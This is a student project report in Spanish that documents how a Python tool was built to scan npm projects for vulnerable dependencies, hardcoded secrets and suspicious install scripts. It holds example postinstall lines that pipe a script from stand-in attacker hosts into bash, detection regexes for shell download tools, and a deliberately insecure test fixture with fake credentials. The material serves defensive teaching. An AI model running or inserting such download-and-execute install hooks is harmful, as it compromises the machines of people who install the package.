# TPI — Seguridad en el Desarrollo de Software (4K2)

**Herramienta de análisis de cadena de suministro de software**

- **Curso:** 4K2 — UTN FRC — Ingeniería en Sistemas de Información
- **Docentes:** Ing. Barrionuevo Ileana, Ing. Parisi Germán, Ing. Sampieri Matias
- **Grupo:** Adragna Jimena Sofía · Gomez Alameda Romina Abigail · Micheli Genoves · Saggiorato Gina
- **Exposición oral:** viernes 13/11/2026

Este documento registra, paso a paso, el desarrollo de la herramienta desde el entorno de trabajo hasta la primera versión funcional (Pasos 1 a 10). Las mejoras acordadas para una segunda etapa (extensión a `node_modules`, más patrones de secretos, carga por ZIP/Git, interfaz de escritorio, etc.) se documentan aparte.

---

## Plan general

| Fase | Qué se construye |
|---|---|
| 1 | Entorno de trabajo: carpeta del proyecto, entorno virtual, control de versiones |
| 2 | Dependencias del proyecto (`requirements.txt`), con justificación de cada una |
| 3 | Estructura de carpetas y archivos (arquitectura del programa) |
| 4 | Módulo de dependencias: lectura de `package.json` + consulta a la API de OSV |
| 5 | Módulo de detección de secretos expuestos (regex) |
| 6 | Módulo de análisis de scripts de instalación sospechosos |
| 7 | Módulo de reporte final en consola (`rich`) + código de salida para CI/CD |
| 8 | `main.py`: el orquestador que une todo (la CLI) |
| 9 | Proyecto de ejemplo "sucio" a propósito, para pruebas e integración |
| 10 | Informe técnico/tutorial + guion para la exposición del 13/11 |

> **Nota de numeración:** en el desarrollo real, la lectura del `package.json` y la consulta a OSV se implementaron juntas dentro de un mismo módulo (`dependencias.py`), por eso en las secciones siguientes ambas aparecen unificadas bajo el **Paso 4**.

---

## Decisión técnica: Python, no Node.js

La propuesta dejaba ambas opciones abiertas. Se eligió **Python** por lo siguiente:

- `requests` es más simple y legible que `fetch`/`axios` en Node para alguien que recién empieza.
- `rich` genera tablas, colores y paneles en consola con muy poco código — ideal para que el reporte se vea profesional en la expo.
- Python lee `package.json` (JSON) igual de bien que Node, así que no se pierde nada ahí.
- Si a futuro se agrega análisis de `requirements.txt` (Python), tiene más sentido que el propio analizador esté en Python.

La alternativa (Node.js) sería razonable si el objetivo fuera integrar la herramienta como un paquete npm o un hook de `npm install`. Como el objetivo es una CLI standalone tipo "paso de pipeline", Python con `argparse` es más directo.

---

## Paso 1: Preparar el entorno de trabajo

**1.1 — Crear la carpeta del proyecto**

```powershell
mkdir tpi-seguridad-cadena-suministro
cd tpi-seguridad-cadena-suministro
```

Esta carpeta es la raíz de todo el proyecto; nada se crea fuera de ella.

**1.2 — Verificar la instalación de Python**

```powershell
python --version
```

Se requiere Python 3.9 o superior. (En Windows, con el Python Install Manager actual, el comando es `py`/`python`; en Mac/Linux suele ser `python3`.)

**1.3 — Crear un entorno virtual**

```powershell
python -m venv venv
```

Un entorno virtual es una "caja aislada" donde viven las librerías del proyecto (`requests`, `rich`), sin mezclarse con otros proyectos Python de la máquina. Evita el clásico problema de "funciona en mi compu pero no en la del compañero" por versiones distintas de librerías.

**1.4 — Activar el entorno virtual**

- Mac/Linux: `source venv/bin/activate`
- Windows (PowerShell): `venv\Scripts\Activate.ps1`

El prompt de la terminal debe mostrar `(venv)` al principio cuando está activo.

**1.5 — Inicializar Git y el `.gitignore`**

```powershell
git init
```

Crear un archivo `.gitignore` en la raíz del proyecto con:

```
venv/
__pycache__/
*.pyc
.env
```

| Línea | Por qué se ignora |
|---|---|
| `venv/` | Cada integrante genera su propio entorno virtual local; subirlo infla el repo con archivos que no son código propio |
| `__pycache__/`, `*.pyc` | Caché que Python genera automáticamente; se regenera solo |
| `.env` | Reservado para configuración sensible futura; nunca se sube un secreto a un repositorio |

---

## Paso 2: Instalar las dependencias del proyecto

Se usan **3 librerías externas** (todo lo demás lo cubre Python "de fábrica").

### 2.1 — `requests` (para consultar la API de OSV)

Permite mandar pedidos HTTP (en este caso, un `POST` a `api.osv.dev`) de forma simple.

**Por qué esta y no otra:**
- La alternativa nativa `urllib.request` viene incluida en Python, pero su sintaxis es mucho más verbosa para armar un POST con JSON.
- `requests` es el estándar de facto en la industria Python, y resuelve la consulta completa en 3-4 líneas.
- Se descartó `httpx` (pensada para código asíncrono) porque el análisis es secuencial; sumar asincronismo sería complejidad innecesaria.

### 2.2 — `rich` (para la salida en consola)

Permite mostrar tablas, colores y paneles prolijos en la terminal, en vez de `print()` con texto plano.

**Por qué esta y no otra:**
- Con `print()` a secas el resultado se vería poco profesional para una entrega académica con exposición oral.
- La alternativa más liviana (`colorama`) solo agrega color, sin tablas; `rich` cubre color, tablas y paneles en una sola librería.
- Es mantenida activamente y usada en herramientas de seguridad reales (scanners de CLI), lo que suma como argumento en el informe.

### 2.3 — Sobre el parseo de argumentos (no es una dependencia nueva)

Para usar el programa como `python main.py ./mi-proyecto`, se usa `argparse`, **incluido en Python**. La alternativa `click` es más cómoda para CLIs grandes, pero para 2-3 opciones `argparse` alcanza, y evita sumar una dependencia innecesaria — menos dependencias externas implica menor superficie de ataque, un principio de seguridad citable en el informe.

### 2.4 — `requirements.txt`

```
requests>=2.31.0
rich>=13.7.0
```

Se fija una versión mínima (no una versión exacta ni "sin versión") para evitar que alguien instale una versión muy vieja sin las funciones necesarias, y para que todo el equipo use versiones compatibles entre sí.

### 2.5 — Instalación y verificación

```powershell
pip install -r requirements.txt
pip list
```

`pip list` debe mostrar `requests` y `rich` (junto con dependencias internas de `rich`, como `pygments` o `markdown-it-py` — es normal).

### 2.6 — Commit

```powershell
git add requirements.txt
git commit -m "Agregar dependencias del proyecto"
git push
```

---

## Paso 3: Estructura de carpetas y archivos

```
tpi-seguridad-cadena-suministro/
│
├── venv/
├── .gitignore
├── requirements.txt
├── README.md
├── main.py                    ← punto de entrada: lo que corre el usuario
│
├── analizador/                 ← paquete con toda la lógica del programa
│   ├── __init__.py
│   ├── dependencias.py        ← lee package.json y consulta OSV
│   ├── secretos.py            ← busca credenciales hardcodeadas con regex
│   ├── scripts_npm.py         ← analiza scripts de instalación sospechosos
│   └── reporte.py             ← arma la salida final en consola (rich)
│
└── proyecto_ejemplo/           ← proyecto "sucio" de prueba
```

### Por qué esta organización (y no todo en un solo archivo)

El programa se separa en módulos por **separación de responsabilidades**: cada archivo hace una sola cosa.

- `dependencias.py` solo sabe leer archivos de dependencias y hablar con OSV.
- `secretos.py` solo sabe buscar patrones de credenciales.
- `scripts_npm.py` solo sabe analizar scripts de instalación.
- `reporte.py` solo sabe mostrar resultados en pantalla.
- `main.py` es el "director de orquesta": no analiza nada, solo llama a los demás módulos en orden.

Ventaja práctica: si algo falla (por ejemplo, la consulta a OSV), hay que revisar un solo archivo chico, no un archivo de 300 líneas. En la expo, cada archivo se puede mostrar y explicar por separado.

`analizador/` es un **paquete** de Python (una carpeta que agrupa módulos relacionados). El archivo `__init__.py` puede quedar vacío — su sola presencia le indica a Python que trate la carpeta como un paquete importable.

### Comandos usados

```powershell
New-Item -ItemType Directory -Name analizador
New-Item -ItemType File -Path analizador\__init__.py
New-Item -ItemType File -Path analizador\dependencias.py
New-Item -ItemType File -Path analizador\secretos.py
New-Item -ItemType File -Path analizador\scripts_npm.py
New-Item -ItemType File -Path analizador\reporte.py
New-Item -ItemType File -Path main.py
New-Item -ItemType File -Path README.md
```

---

## Paso 4: Módulo `dependencias.py`

Dos responsabilidades: leer el `package.json` del proyecto analizado, y consultar la API de OSV para saber si alguna dependencia tiene vulnerabilidades conocidas.

### 4.1 — Leer el `package.json`

```python
import json

def leer_dependencias_npm(ruta_proyecto):
    """
    Lee el archivo package.json del proyecto y devuelve un diccionario
    con el nombre de cada dependencia y su versión declarada.
    """
    ruta_package_json = f"{ruta_proyecto}/package.json"

    with open(ruta_package_json, "r", encoding="utf-8") as archivo:
        datos = json.load(archivo)

    dependencias = {}
    dependencias.update(datos.get("dependencies", {}))
    dependencias.update(datos.get("devDependencies", {}))

    return dependencias
```

- `with open(...)`: garantiza que el archivo se cierre solo al terminar el bloque, aunque ocurra un error en el medio.
- `datos.get("dependencies", {})`: si el archivo no tiene esa clave, devuelve `{}` en vez de romper el programa.
- Se unen `dependencies` y `devDependencies` porque interesan **todas** las dependencias para el análisis de seguridad, sean de producción o de desarrollo.

### 4.2 — Limpiar el formato de versión de npm

```python
def limpiar_version(version):
    """
    Quita los símbolos de rango que usa npm (^, ~, >=, etc.) para
    quedarnos con el número de versión exacto que necesita OSV.
    """
    caracteres_a_quitar = "^~>=< "
    return version.lstrip(caracteres_a_quitar)
```

`lstrip()` elimina, desde el principio del texto, cualquier carácter presente en el string dado, hasta encontrar uno que no lo esté. Ejemplo: `"^4.17.21".lstrip("^~>=< ")` → `"4.17.21"`.

### 4.3 — Consultar la API de OSV

```python
import requests

URL_OSV = "https://api.osv.dev/v1/query"

def consultar_vulnerabilidades(nombre_paquete, version, ecosistema="npm"):
    """
    Consulta la API de OSV por un paquete y versión puntuales.
    Devuelve la lista de vulnerabilidades encontradas (vacía si no tiene).
    """
    cuerpo_pedido = {
        "package": {
            "name": nombre_paquete,
            "ecosystem": ecosistema
        },
        "version": version
    }

    respuesta = requests.post(URL_OSV, json=cuerpo_pedido, timeout=10)
    respuesta.raise_for_status()

    datos = respuesta.json()
    return datos.get("vulns", [])
```

- `cuerpo_pedido`: OSV espera un objeto `"package"` (nombre + ecosistema) y, aparte, la `"version"`.
- `timeout=10`: decisión de buenas prácticas de seguridad/confiabilidad. Si OSV no responde en 10 segundos, el programa falla en vez de quedarse colgado indefinidamente (denegación de servicio por falta de timeout).
- `raise_for_status()`: si la respuesta HTTP es un error (404, 500, etc.), lanza una excepción ahí mismo en vez de fallar más adelante de forma confusa.
- `datos.get("vulns", [])`: si el paquete no tiene vulnerabilidades, OSV devuelve el JSON sin la clave `"vulns"`.

### 4.4 — Función principal del módulo

```python
def analizar_dependencias_npm(ruta_proyecto):
    """
    Función principal del módulo: lee las dependencias del proyecto y
    devuelve solo aquellas que tienen vulnerabilidades conocidas.
    """
    dependencias = leer_dependencias_npm(ruta_proyecto)
    hallazgos = []

    for nombre, version_cruda in dependencias.items():
        version = limpiar_version(version_cruda)
        vulnerabilidades = consultar_vulnerabilidades(nombre, version)

        if vulnerabilidades:
            severidades = [
                v.get("database_specific", {}).get("severity", "DESCONOCIDA")
                for v in vulnerabilidades
            ]
            hallazgos.append({
                "paquete": nombre,
                "version": version,
                "cantidad": len(vulnerabilidades),
                "ids": [v["id"] for v in vulnerabilidades],
                "severidad_maxima": _severidad_mas_alta(severidades)
            })

    return hallazgos


def _severidad_mas_alta(lista_severidades):
    """
    Dada una lista de severidades (texto), devuelve la más grave.
    El guion bajo al principio del nombre es una convención de Python
    para indicar "función interna de este módulo, no pensada para
    usarse desde afuera".
    """
    orden = {"CRITICAL": 4, "HIGH": 3, "MODERATE": 2, "LOW": 1, "DESCONOCIDA": 0}
    return max(lista_severidades, key=lambda s: orden.get(s, 0))
```

- `v.get("database_specific", {}).get("severity", "DESCONOCIDA")`: dos `.get()` encadenados porque la severidad está anidada dentro de `database_specific`. Se usan valores por defecto en ambos niveles porque no todos los registros de OSV traen la severidad en el mismo lugar.
- `_severidad_mas_alta`: un mismo paquete puede tener varias vulnerabilidades de distinta gravedad (por ejemplo, HIGH y MODERATE mezcladas); se destaca la peor en el resumen. `max(..., key=lambda s: orden.get(s, 0))` compara según el número asignado en el diccionario `orden`, no el texto directamente.
- `[v["id"] for v in vulnerabilidades]`: *list comprehension* — forma compacta de armar una lista nueva recorriendo otra, quedándose solo con el `"id"` de cada vulnerabilidad.

### 4.5 — Prueba realizada

```python
from analizador.dependencias import consultar_vulnerabilidades
resultado = consultar_vulnerabilidades("lodash", "4.17.15")
print(resultado)
```

**Resultado real obtenido:** 5 vulnerabilidades conocidas para `lodash@4.17.15`, incluyendo `GHSA-35jh-r3h4-6jhm` (Command Injection, severidad HIGH) y `GHSA-r5fr-rjxr-66jc` (Code Injection, severidad HIGH, reportada en 2026) — confirmando que el módulo consulta datos reales y actualizados de la base de OSV, no datos simulados.

---

## Paso 5: Módulo `secretos.py`

Recorre todos los archivos del proyecto y busca, en cada uno, patrones de texto que parezcan credenciales (API keys, contraseñas en cadenas de conexión, tokens).

### 5.1 — Patrones (expresiones regulares)

Una **expresión regular** (regex) describe la "forma" de un texto, para poder buscarla. Por ejemplo, una API key de AWS siempre empieza con `AKIA` seguido de 16 letras/números mayúsculas.

```python
import re
import os

PATRONES_SECRETOS = {
    "AWS Access Key": re.compile(r"AKIA[0-9A-Z]{16}"),
    "API Key genérica": re.compile(r"(?i)(api[_-]?key)\s*[:=]\s*['\"][a-zA-Z0-9_\-]{16,}['\"]"),
    "Password en código": re.compile(r"(?i)(password|contraseña|pwd)\s*[:=]\s*['\"][^'\"]{4,}['\"]"),
    "Cadena de conexión con credenciales": re.compile(r"(?i)(mongodb|postgres|mysql)(\+srv)?:\/\/[^:\s]+:[^@\s]+@"),
    "Token JWT": re.compile(r"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+"),
    "Clave privada": re.compile(r"-----BEGIN (RSA |EC |)PRIVATE KEY-----"),
}
```

- `re.compile(...)`: precompila el patrón para que la búsqueda sea más rápida al reutilizarlo archivo tras archivo.
- El prefijo `r"..."` (*raw string*) evita tener que escapar las barras invertidas que usan las regex (`\s`, `\d`, etc.).

**Desglose del patrón `API Key genérica` (los demás siguen la misma lógica):**

| Fragmento | Significado |
|---|---|
| `(?i)` | Ignora mayúsculas/minúsculas |
| `(api[_-]?key)` | `api`, seguido opcionalmente de `_` o `-`, seguido de `key` |
| `\s*[:=]\s*` | Espacios opcionales, `:` o `=`, espacios opcionales |
| `['\"]` | Comilla de apertura |
| `[a-zA-Z0-9_\-]{16,}` | El valor: letras, números y guiones, de al menos 16 caracteres |
| `['\"]` | Comilla de cierre |

**Por qué estos 6 patrones y no más:** cubren los casos mencionados explícitamente en la propuesta (API keys, cadenas de conexión, tokens). Existen herramientas con cientos de patrones (`gitleaks`, `trufflehog`), pero para el alcance del TPI, patrones bien elegidos y explicados valen más que una lista extensa copiada sin entenderla. *(La ampliación de esta cobertura, basada en fuentes públicas confiables, está prevista como mejora de segunda etapa — ver documento de mejoras pendientes.)*

### 5.2 — Recorrer los archivos del proyecto

```python
CARPETAS_A_IGNORAR = {"node_modules", "venv", ".git", "dist", "build", "__pycache__"}

def recorrer_archivos(ruta_proyecto):
    """
    Recorre todos los archivos de texto del proyecto, saltando carpetas
    que no interesa analizar (dependencias instaladas, control de
    versiones, archivos compilados).
    """
    for carpeta_actual, subcarpetas, archivos in os.walk(ruta_proyecto):
        subcarpetas[:] = [c for c in subcarpetas if c not in CARPETAS_A_IGNORAR]

        for nombre_archivo in archivos:
            yield os.path.join(carpeta_actual, nombre_archivo)
```

- `CARPETAS_A_IGNORAR`: `node_modules` puede tener decenas de miles de archivos de terceros; analizarlos no aporta y haría la herramienta muy lenta.
- `os.walk`: recorre una carpeta y todas sus subcarpetas, entregando en cada vuelta la carpeta actual, las subcarpetas y los archivos.
- `subcarpetas[:] = [...]`: modifica la lista *en el lugar* para que `os.walk` respete la poda y no entre a las carpetas ignoradas.
- `yield`: convierte la función en un **generador** — entrega un archivo a la vez en vez de construir una lista gigante en memoria, más eficiente para proyectos grandes.

### 5.3 — Buscar secretos en un archivo

```python
EXTENSIONES_A_ANALIZAR = {".js", ".ts", ".py", ".json", ".env", ".yml", ".yaml", ".txt", ".md"}

def buscar_secretos_en_archivo(ruta_archivo):
    """
    Abre un archivo de texto y busca todos los patrones de secretos.
    Devuelve una lista de hallazgos con el tipo y el número de línea.
    """
    _, extension = os.path.splitext(ruta_archivo)
    if extension not in EXTENSIONES_A_ANALIZAR:
        return []

    hallazgos = []

    try:
        with open(ruta_archivo, "r", encoding="utf-8", errors="ignore") as archivo:
            for numero_linea, linea in enumerate(archivo, start=1):
                for nombre_patron, patron in PATRONES_SECRETOS.items():
                    if patron.search(linea):
                        hallazgos.append({
                            "archivo": ruta_archivo,
                            "linea": numero_linea,
                            "tipo": nombre_patron
                        })
    except (UnicodeDecodeError, PermissionError):
        pass

    return hallazgos
```

- Solo se analizan extensiones de texto donde tendría sentido encontrar una credencial escrita a mano.
- `errors="ignore"`: evita que el programa falle ante archivos con caracteres no válidos en UTF-8.
- `enumerate(archivo, start=1)`: numera las líneas empezando en 1, como las cuenta una persona.
- `try / except (UnicodeDecodeError, PermissionError): pass`: si un archivo puntual no se puede leer, se lo saltea y se sigue con el resto. Decisión de **robustez**: una herramienta de seguridad que se cae ante el primer archivo raro no sirve para analizar proyectos reales.

### 5.4 — Función principal del módulo

```python
def analizar_secretos(ruta_proyecto):
    """
    Función principal: recorre todo el proyecto y devuelve todos los
    secretos potenciales encontrados.
    """
    todos_los_hallazgos = []

    for ruta_archivo in recorrer_archivos(ruta_proyecto):
        hallazgos_archivo = buscar_secretos_en_archivo(ruta_archivo)
        todos_los_hallazgos.extend(hallazgos_archivo)

    return todos_los_hallazgos
```

Se usa `.extend()` en vez de `.append()` porque `buscar_secretos_en_archivo` devuelve una lista (puede haber varios hallazgos por archivo), y se suman todos a la lista general uno por uno.

### 5.5 — Prueba realizada

Con un archivo `config.js` de prueba conteniendo una API key, una cadena de conexión con credenciales y una AWS key, `analizar_secretos()` devolvió correctamente los 3 hallazgos, cada uno con archivo, línea y tipo de patrón detectado.

---

## Paso 6: Módulo `scripts_npm.py`

Analiza los **scripts de ciclo de vida** que una dependencia puede declarar en su `package.json` — comandos que npm ejecuta automáticamente al instalar, y que pueden usarse para ejecutar código malicioso sin que el usuario lo note.

### 6.1 — El problema

Al correr `npm install`, si el `package.json` de una dependencia tiene un script `postinstall`, npm lo **ejecuta automáticamente** sin pedir confirmación:

```json
{
  "scripts": {
    "postinstall": "curl http://atacante.com/malware.sh | bash"
  }
}
```

Esto descarga código de internet y lo ejecuta, solo por instalar la librería. Es un vector de ataque real y documentado en la cadena de suministro de npm.

### 6.2 — Patrones de riesgo

```python
import json
import re

SCRIPTS_DE_INSTALACION = {"preinstall", "install", "postinstall"}

PATRONES_DE_RIESGO = {
    "Descarga de red": re.compile(r"\b(curl|wget|fetch)\b"),
    "Ejecución de código dinámico": re.compile(r"\beval\s*\("),
    "Pipe a intérprete de comandos": re.compile(r"\|\s*(bash|sh|zsh|cmd|powershell)\b"),
    "Ejecución de binario descargado": re.compile(r"chmod\s+\+x"),
    "Codificación/ofuscación": re.compile(r"\b(base64|atob|Buffer\.from)\b"),
}
```

| Patrón | Qué detecta |
|---|---|
| Descarga de red | `curl`, `wget`, `fetch` como palabras completas (`\b`) |
| Ejecución de código dinámico | `eval(` siendo llamada como función |
| Pipe a intérprete de comandos | El patrón clásico `... \| bash` que descarga y ejecuta en un paso |
| Ejecución de binario descargado | `chmod +x`, típico antes de correr un binario bajado |
| Codificación/ofuscación | Formas comunes de decodificar contenido oculto en JavaScript |

`SCRIPTS_DE_INSTALACION` son los 3 nombres de script que npm ejecuta automáticamente — mencionados explícitamente en la propuesta.

### 6.3 — Evaluar el riesgo de un script

```python
def evaluar_riesgo_script(contenido_script):
    """
    Revisa el texto de un script de instalación y devuelve la lista
    de patrones de riesgo que contiene.
    """
    riesgos_encontrados = []
    for nombre_patron, patron in PATRONES_DE_RIESGO.items():
        if patron.search(contenido_script):
            riesgos_encontrados.append(nombre_patron)
    return riesgos_encontrados


def nivel_de_riesgo(cantidad_patrones):
    """
    Traduce la cantidad de patrones de riesgo detectados en un script
    a una etiqueta de severidad.
    """
    if cantidad_patrones >= 2:
        return "alto"
    elif cantidad_patrones == 1:
        return "medio"
    else:
        return "bajo"
```

Se separa "qué patrones matchean" de "qué tan grave es" en dos funciones. Un script con 2 o más señales combinadas (por ejemplo, descarga de red y pipe a bash) es mucho más sospechoso que uno con una sola señal aislada.

### 6.4 — Función principal del módulo

```python
def analizar_scripts_instalacion(ruta_proyecto):
    """
    Lee el package.json del proyecto y evalúa los scripts de
    instalación (preinstall, install, postinstall) en busca de
    patrones de riesgo.
    """
    ruta_package_json = f"{ruta_proyecto}/package.json"

    with open(ruta_package_json, "r", encoding="utf-8") as archivo:
        datos = json.load(archivo)

    scripts = datos.get("scripts", {})
    hallazgos = []

    for nombre_script, contenido in scripts.items():
        if nombre_script not in SCRIPTS_DE_INSTALACION:
            continue

        riesgos = evaluar_riesgo_script(contenido)

        if riesgos:
            hallazgos.append({
                "script": nombre_script,
                "contenido": contenido,
                "patrones_detectados": riesgos,
                "riesgo": nivel_de_riesgo(len(riesgos))
            })

    return hallazgos
```

Scripts como `test`, `build` o `start` no se ejecutan automáticamente al instalar, así que se ignoran — no son el vector de ataque que interesa.

> **Limitación conocida (pendiente de resolver en la segunda etapa):** esta función solo analiza el `package.json` **raíz** del proyecto. La propuesta pide analizar *"el package.json de las dependencias directas"* — en un proyecto real, cada paquete dentro de `node_modules/` tiene su propio `package.json`, y ahí suele esconderse un script malicioso. Esta extensión es un pendiente obligatorio antes de la entrega final.

---

## Paso 7: Módulo `reporte.py`

Toma los resultados de los tres análisis y arma la salida final en consola con `rich`: tablas, colores por nivel de riesgo, y un resumen con el código de salida para CI/CD.

### 7.1 — Configuración base

```python
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()

COLOR_POR_RIESGO = {
    "alto": "red",
    "medio": "yellow",
    "bajo": "green",
    "HIGH": "red",
    "CRITICAL": "red",
    "MODERATE": "yellow",
    "LOW": "green",
    "DESCONOCIDA": "white",
}
```

`COLOR_POR_RIESGO` unifica ambos vocabularios (`"alto"/"medio"/"bajo"` del módulo de scripts, y `"HIGH"/"MODERATE"/...` de OSV) para no tener que traducir niveles entre módulos.

### 7.2 — Secciones del reporte

```python
def mostrar_dependencias_vulnerables(hallazgos):
    if not hallazgos:
        console.print("[bold green]✓[/bold green] No se encontraron dependencias con vulnerabilidades conocidas.\n")
        return

    tabla = Table(title="Dependencias vulnerables")
    tabla.add_column("Paquete", style="bold")
    tabla.add_column("Versión")
    tabla.add_column("Vulnerabilidades")
    tabla.add_column("Severidad máxima")
    tabla.add_column("IDs")

    for item in hallazgos:
        color = COLOR_POR_RIESGO.get(item["severidad_maxima"], "white")
        tabla.add_row(
            item["paquete"],
            item["version"],
            str(item["cantidad"]),
            f"[{color}]{item['severidad_maxima']}[/{color}]",
            ", ".join(item["ids"])
        )

    console.print(tabla)
    console.print()


def mostrar_secretos_expuestos(hallazgos):
    if not hallazgos:
        console.print("[bold green]✓[/bold green] No se encontraron secretos expuestos.\n")
        return

    tabla = Table(title="Secretos expuestos")
    tabla.add_column("Archivo", style="bold")
    tabla.add_column("Línea")
    tabla.add_column("Tipo")

    for item in hallazgos:
        tabla.add_row(
            item["archivo"],
            str(item["linea"]),
            f"[red]{item['tipo']}[/red]"
        )

    console.print(tabla)
    console.print()


def mostrar_scripts_sospechosos(hallazgos):
    if not hallazgos:
        console.print("[bold green]✓[/bold green] No se encontraron scripts de instalación sospechosos.\n")
        return

    tabla = Table(title="Scripts de instalación sospechosos")
    tabla.add_column("Script", style="bold")
    tabla.add_column("Riesgo")
    tabla.add_column("Patrones detectados")
    tabla.add_column("Contenido")

    for item in hallazgos:
        color = COLOR_POR_RIESGO.get(item["riesgo"], "white")
        tabla.add_row(
            item["script"],
            f"[{color}]{item['riesgo']}[/{color}]",
            ", ".join(item["patrones_detectados"]),
            item["contenido"]
        )

    console.print(tabla)
    console.print()
```

Si la lista de hallazgos viene vacía, se muestra un mensaje positivo en vez de una tabla vacía. Los tags `[color]texto[/color]` son la sintaxis de estilo de `rich`, similar a HTML.

### 7.3 — Resumen final y código de salida

```python
def mostrar_resumen_y_calcular_salida(dependencias, secretos, scripts):
    """
    Muestra un panel resumen con la cantidad total de hallazgos y
    devuelve el código de salida que debería usar el programa:
    0 si no hay hallazgos críticos, 1 si los hay.
    """
    total_dependencias = len(dependencias)
    total_secretos = len(secretos)
    total_scripts = len(scripts)
    total_general = total_dependencias + total_secretos + total_scripts

    hay_criticos = (
        total_secretos > 0
        or any(item["riesgo"] == "alto" for item in scripts)
        or any(item["severidad_maxima"] in ("HIGH", "CRITICAL") for item in dependencias)
    )

    color_resumen = "red" if hay_criticos else "green"
    estado = "⚠ Se encontraron hallazgos críticos" if hay_criticos else "✓ Sin hallazgos críticos"

    texto = (
        f"Dependencias vulnerables: {total_dependencias}\n"
        f"Secretos expuestos: {total_secretos}\n"
        f"Scripts sospechosos: {total_scripts}\n"
        f"Total de hallazgos: {total_general}\n\n"
        f"[bold {color_resumen}]{estado}[/bold {color_resumen}]"
    )

    console.print(Panel(texto, title="Resumen del análisis", border_style=color_resumen))

    return 1 if hay_criticos else 0
```

- `hay_criticos`: se considera crítico si hay **cualquier** secreto expuesto, o algún script con riesgo "alto", o alguna dependencia con severidad HIGH/CRITICAL según OSV.
- `sys.exit(codigo_salida)` (en `main.py`) usa el valor devuelto: `0` significa éxito, cualquier otro número indica un problema. Un pipeline de CI/CD (como GitHub Actions) revisa ese código para decidir si bloquea el proceso.

---

## Paso 8: `main.py` — uniendo todo

Único responsable de: leer los argumentos de línea de comandos, llamar a los 3 análisis en orden, pasar los resultados al reporte, y terminar con el código de salida correcto.

```python
import argparse
import sys

from analizador.dependencias import analizar_dependencias_npm
from analizador.secretos import analizar_secretos
from analizador.scripts_npm import analizar_scripts_instalacion
from analizador.reporte import (
    mostrar_dependencias_vulnerables,
    mostrar_secretos_expuestos,
    mostrar_scripts_sospechosos,
    mostrar_resumen_y_calcular_salida,
)


def crear_parser_argumentos():
    parser = argparse.ArgumentParser(
        prog="analizador-cadena-suministro",
        description="Analiza un proyecto en busca de dependencias vulnerables, "
                     "secretos expuestos y scripts de instalación sospechosos."
    )
    parser.add_argument(
        "ruta",
        help="Ruta a la carpeta del proyecto a analizar"
    )
    return parser


def main():
    parser = crear_parser_argumentos()
    argumentos = parser.parse_args()
    ruta_proyecto = argumentos.ruta

    print(f"Analizando proyecto en: {ruta_proyecto}\n")

    try:
        dependencias = analizar_dependencias_npm(ruta_proyecto)
    except FileNotFoundError:
        print("Aviso: no se encontró package.json, se omite el análisis de dependencias.\n")
        dependencias = []

    secretos = analizar_secretos(ruta_proyecto)

    try:
        scripts = analizar_scripts_instalacion(ruta_proyecto)
    except FileNotFoundError:
        scripts = []

    mostrar_dependencias_vulnerables(dependencias)
    mostrar_secretos_expuestos(secretos)
    mostrar_scripts_sospechosos(scripts)

    codigo_salida = mostrar_resumen_y_calcular_salida(dependencias, secretos, scripts)
    sys.exit(codigo_salida)


if __name__ == "__main__":
    main()
```

**Puntos clave:**
- `try / except FileNotFoundError`: robustez ante proyectos sin `package.json` (por ejemplo, proyectos puramente Python). El análisis de secretos, que no depende de `package.json`, igual se ejecuta.
- `parser.add_argument("ruta", ...)`: argumento posicional obligatorio — se usa como `python main.py ./mi-proyecto`.
- `if __name__ == "__main__":`: convención estándar de Python que permite importar funciones de `main.py` desde otro archivo (por ejemplo, para testing) sin disparar la ejecución completa.

**Pruebas realizadas:**
- `python main.py --help` → genera automáticamente la ayuda de uso, sin código adicional.
- `python main.py ./esta-carpeta-no-existe` → no rompe el programa; muestra el aviso correspondiente y el resumen con todo en cero.

---

## Paso 9: Proyecto de ejemplo "sucio"

Se armó un proyecto de prueba (`proyecto_ejemplo/`) con las 3 condiciones a detectar, para validar el funcionamiento integrado y contar con material para la demo en vivo.

**`proyecto_ejemplo/package.json`:**

```json
{
  "name": "proyecto-de-prueba",
  "version": "1.0.0",
  "dependencies": {
    "lodash": "4.17.15"
  },
  "scripts": {
    "test": "echo \"sin tests\"",
    "postinstall": "curl http://ejemplo-malicioso.com/payload.sh | bash"
  }
}
```

- `lodash@4.17.15` tiene 5 vulnerabilidades reales confirmadas en OSV (Paso 4.5).
- El script `postinstall` combina dos patrones de riesgo a la vez (descarga de red + pipe a bash), por lo que debería salir con riesgo "alto".
- El script `test` no es un script de instalación automática, por lo que no debería aparecer en los hallazgos (confirma que el filtro funciona).

**`proyecto_ejemplo/config.js`:**

```javascript
const apiKey = "sk_test_51Hh8s9FjL2kP9mN3qR7tY6wZ";
const dbUrl = "mongodb://admin:SuperSecreto123@localhost:27017/miapp";
const awsKey = "AKIAIOSFODNN7EXAMPLE";

function conectar() {
  console.log("Conectando a la base de datos...");
}
```

### Resultado de la ejecución completa

```powershell
python main.py ./proyecto_ejemplo
```

| Sección | Resultado |
|---|---|
| Dependencias vulnerables | `lodash 4.17.15` — 5 vulnerabilidades, severidad máxima HIGH |
| Secretos expuestos | 3 hallazgos (API key, cadena de conexión, AWS key) |
| Scripts sospechosos | 1 hallazgo — `postinstall`, riesgo alto, patrones "Descarga de red" y "Pipe a intérprete de comandos" |
| **Resumen** | **5 hallazgos totales**, hallazgos críticos detectados, **código de salida 1** |

El resultado confirma que los tres módulos funcionan de forma integrada y que el código de salida simula correctamente el bloqueo de un pipeline de CI/CD.

---

## Errores encontrados durante la configuración y sus soluciones

| Problema | Causa | Solución |
|---|---|---|
| `python3` no reconocido en Windows (abre la Microsoft Store) | Alias de la Store de Windows, Python no instalado todavía | Instalar Python desde [python.org](https://www.python.org/downloads/) usando el Python Install Manager (`py install 3.13`) |
| Advertencia de rutas largas (260 caracteres) durante la instalación | Límite histórico de Windows (MS-DOS) | Aceptar la habilitación de rutas largas que ofrece el instalador; requiere reiniciar la PC |
| `venv\Scripts\Activate.ps1` no se puede cargar: "la ejecución de scripts está deshabilitada" | Política de ejecución de PowerShell bloquea scripts `.ps1` sin firma | `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned`. Se eligió `RemoteSigned` (no `Unrestricted`) porque permite scripts locales sin firma, pero sigue exigiendo firma digital para scripts descargados de internet — el balance correcto para una materia de seguridad |
| `git` no reconocido como comando | Git no estaba instalado (computadora nueva) | `winget install --id Git.Git -e --source winget`, y abrir una terminal nueva para que tome el cambio de PATH |
